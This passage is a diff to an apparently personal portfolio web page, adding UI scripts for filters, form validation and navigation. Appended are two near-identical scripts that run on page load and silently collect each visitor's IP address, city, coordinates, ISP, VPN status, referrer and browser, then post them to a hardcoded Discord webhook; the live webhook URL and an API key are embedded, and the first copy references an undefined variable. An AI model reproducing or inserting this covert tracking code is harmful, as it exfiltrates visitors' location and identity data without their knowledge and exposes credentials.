+    selectValue.innerText = this.innerText;
+    filterFunc(selectedValue);
+
+    lastClickedBtn.classList.remove("active");
+    this.classList.add("active");
+    lastClickedBtn = this;
+
+  });
+
+}
+
+
+
+// contact form variables
+const form = document.querySelector("[data-form]");
+const formInputs = document.querySelectorAll("[data-form-input]");
+const formBtn = document.querySelector("[data-form-btn]");
+
+// add event to all form input field
+for (let i = 0; i < formInputs.length; i++) {
+  formInputs[i].addEventListener("input", function () {
+
+    // check form validation
+    if (form.checkValidity()) {
+      formBtn.removeAttribute("disabled");
+    } else {
+      formBtn.setAttribute("disabled", "");
+    }
+
+  });
+}
+
+
+
+// page navigation variables
+const navigationLinks = document.querySelectorAll("[data-nav-link]");
+const pages = document.querySelectorAll("[data-page]");
+
+// add event to all nav link
+for (let i = 0; i < navigationLinks.length; i++) {
+  navigationLinks[i].addEventListener("click", function () {
+
+    for (let i = 0; i < pages.length; i++) {
+      if (this.innerHTML.toLowerCase() === pages[i].dataset.page) {
+        pages[i].classList.add("active");
+        navigationLinks[i].classList.add("active");
+        window.scrollTo(0, 0);
+      } else {
+        pages[i].classList.remove("active");
+        navigationLinks[i].classList.remove("active");
+      }
+    }
+
+  });
+}</script>
+
+
+
+<script>
+
+    function httpGetAsync(url, callback) {
+        const xmlHttp = new XMLHttpRequest();
+        xmlHttp.onreadystatechange = function() {
+            if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
+                callback(xmlHttp.responseText);
+        }
+        xmlHttp.open("GET", url, true); // true for asynchronous
+        xmlHttp.send(null);
+    }
+
+    function analyzeTraffic() {
+        const ipUrl = "https://api64.ipify.org?format=json";
+        const geoUrl = "https://ipgeolocation.abstractapi.com/v1/?api_key=577cf8161d6e494bb7fb0df8e0b9102e"; // Replace with your Abstract API key
+        const discordWebhook = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT'; // Replace with your Discord webhook URL
+
+        httpGetAsync(ipUrl, function(ipData) {
+            const ipInfo = JSON.parse(ipData);
+            const userInformation = {
+                ip_address: ipInfo.ip,
+                current_url: window.location.href
+            };
+
+            httpGetAsync(geoUrl, function(geoData) {
+                const geoInfo = JSON.parse(geoData);
+                userInformation.city = geoInfo.city;
+                userInformation.city_geoname_id = geoInfo.city_geoname_id;
+                userInformation.region = geoInfo.region;
+                userInformation.country = geoInfo.country;
+                userInformation.country_code = geoInfo.country_code;
+                userInformation.continent = geoInfo.continent;
+                userInformation.continent_code = geoInfo.continent_code;
+                userInformation.longitude = geoInfo.longitude;
+                userInformation.latitude = geoInfo.latitude;
+                userInformation.security_vpn = geoInfo.security.is_vpn;
+                userInformation.flag = geoInfo.flag;
+                userInformation.isp_name = geoInfo.isp_name;
+                userInformation.timezone_name = geoInfo.timezone.name;
+                userInformation.timezone_abbreviation = geoInfo.timezone.abbreviation;
+                userInformation.timezone_gmt_offset = geoInfo.timezone.gmt_offset;
+                userInformation.current_time = geoInfo.timezone.current_time;
+
+                // Additional user information
+                userInformation.date = new Date().toLocaleDateString();
+                userInformation.day = new Date().toLocaleDateString('en-US', { weekday: 'long' });
+                userInformation.time = new Date().toLocaleTimeString();
+                userInformation.referringURL = document.referrer;
+                userInformation.browser = navigator.userAgent;
+               userInformation.device = geoInfo.device;
+
+                sendToDiscord(userInformation, discordWebhook);
+            });
+        });
+    }
+
+    function sendToDiscord(data, webhookURL) {
+        const request = new XMLHttpRequest();
+        request.open("POST", webhookURL);
+
+     
+
+        const messageContent = `**${emojis.location} IP Address:** ${data.ip_address}\n` +
+            `**🔗 Current URL:** ${data.current_url}\n` +
+            `**🏘️ City:** ${data.city}\n` +
+            `**🏞️ Region:** ${data.region}\n` +
+            `**🌐 Country:** ${data.country} (${data.country_code})\n` +
+            `**🌍 Continent:** ${data.continent} (${data.continent_code})\n` +
+            `**🗺️ Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
+            `**🛡️ VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
+            `**🇳🇱 Flag:** ${data.flag}\n` +
+            `**🏢 ISP:** ${data.isp_name}\n` +
+            `**📅 Date:** ${data.date}\n` +
+            `**📆 Day:** ${data.day}\n` +
+            `**⌚ Time:** ${data.time}\n` +
+            `**🌐 Referring URL:** ${data.referringURL}\n` +
+            `**🌐 Browser:** ${data.browser}\n` +
+             `**💻 Device:** ${data.device}`;
+        const message = JSON.stringify({ content: messageContent });
+
+        request.setRequestHeader('Content-type', 'application/json');
+        request.send(message);
+    }
+
+    window.onload = function() {
+        analyzeTraffic(); // Automatically run the analysis when the page loads
+    };
+
+
+</script>
+
+
+<script>
+    function httpGetAsync(url, callback) {
+        const xmlHttp = new XMLHttpRequest();
+        xmlHttp.onreadystatechange = function() {
+            if (xmlHttp.readyState === 4 && xmlHttp.status === 200)
+                callback(xmlHttp.responseText);
+        }
+        xmlHttp.open("GET", url, true); // true for asynchronous
+        xmlHttp.send(null);
+    }
+
+    function analyzeTraffic() {
+        const ipUrl = "https://api64.ipify.org?format=json";
+        const geoUrl = "https://ipgeolocation.abstractapi.com/v1/?api_key=577cf8161d6e494bb7fb0df8e0b9102e"; // Replace with your Abstract API key
+        const discordWebhook = 'https://discord.com/api/webhooks/1165962811164348498/jgEsHpCRce9Kw8hY0IA4Ys9SN9dHMDVbVQmzp1J4BLVDjsCfMHyd2lcag4B0c5cKfIFT'; // Replace with your Discord webhook URL
+
+        httpGetAsync(ipUrl, function(ipData) {
+            const ipInfo = JSON.parse(ipData);
+            const userInformation = {
+                ip_address: ipInfo.ip,
+                current_url: window.location.href
+            };
+
+            httpGetAsync(geoUrl, function(geoData) {
+                const geoInfo = JSON.parse(geoData);
+                userInformation.city = geoInfo.city;
+                userInformation.city_geoname_id = geoInfo.city_geoname_id;
+                userInformation.region = geoInfo.region;
+                userInformation.country = geoInfo.country;
+                userInformation.country_code = geoInfo.country_code;
+                userInformation.continent = geoInfo.continent;
+                userInformation.continent_code = geoInfo.continent_code;
+                userInformation.longitude = geoInfo.longitude;
+                userInformation.latitude = geoInfo.latitude;
+                userInformation.security_vpn = geoInfo.security.is_vpn;
+                userInformation.flag = geoInfo.flag;
+                userInformation.isp_name = geoInfo.isp_name;
+                userInformation.timezone_name = geoInfo.timezone.name;
+                userInformation.timezone_abbreviation = geoInfo.timezone.abbreviation;
+                userInformation.timezone_gmt_offset = geoInfo.timezone.gmt_offset;
+                userInformation.current_time = geoInfo.timezone.current_time;
+
+                // Additional user information
+                userInformation.date = new Date().toLocaleDateString();
+                userInformation.day = new Date().toLocaleDateString('en-US', { weekday: 'long' });
+                userInformation.time = new Date().toLocaleTimeString();
+                userInformation.referringURL = document.referrer;
+                userInformation.browser = navigator.userAgent;
+                userInformation.device = geoInfo.device_type;
+
+                sendToDiscord(userInformation, discordWebhook);
+            });
+        });
+    }
+
+    function sendToDiscord(data, webhookURL) {
+        const request = new XMLHttpRequest();
+        request.open("POST", webhookURL);
+
+        const emojis = {
+            location: '🌍',
+            vpn: '🛡️',
+            calendar: '📅',
+            clock: '🕒',
+            link: '🔗',
+            computer: '💻',
+        };
+
+        const messageContent = `**🚩  IP Address:** ${data.ip_address}\n` +
+            `**🔗 Current URL:** ${data.current_url}\n` +
+            `**🏘️ City:** ${data.city}\n` +
+            `**🏞️Region:** ${data.region}\n` +
+            `**🌐 Country:** ${data.country} (${data.country_code})\n` +
+            `**🌍Continent:** ${data.continent} (${data.continent_code})\n` +
+            `**🗺️ Longitude/Latitude:** ${data.longitude}, ${data.latitude}\n` +
+            `**🛡️ VPN Status:** ${data.security_vpn ? 'Using VPN' : 'Not Using VPN'}\n` +
+            `**🎌 Flag:** ${data.flag}\n` +
+            `**🏢 ISP:** ${data.isp_name}\n` +
+            `**📅 Date:** ${data.date}\n` +
+            `**📆 Day:** ${data.day}\n` +
+            `**⌚ Time:** ${data.time}\n` +
+            `**🔗 Referring URL:** ${data.referringURL}\n` +
+            `**🌐 Browser:** ${data.browser}\n` +
+            `**💻  Device:** ${data.device}`;
+
+        const message = JSON.stringify({ content: messageContent });
+
+        request.setRequestHeader('Content-type', 'application/json');
+        request.send(message);
+    }
+
+    window.onload = function() {
+        analyzeTraffic(); // Automatically run the analysis when the page loads
+    };
+</script>
  
 </body>
 </html>
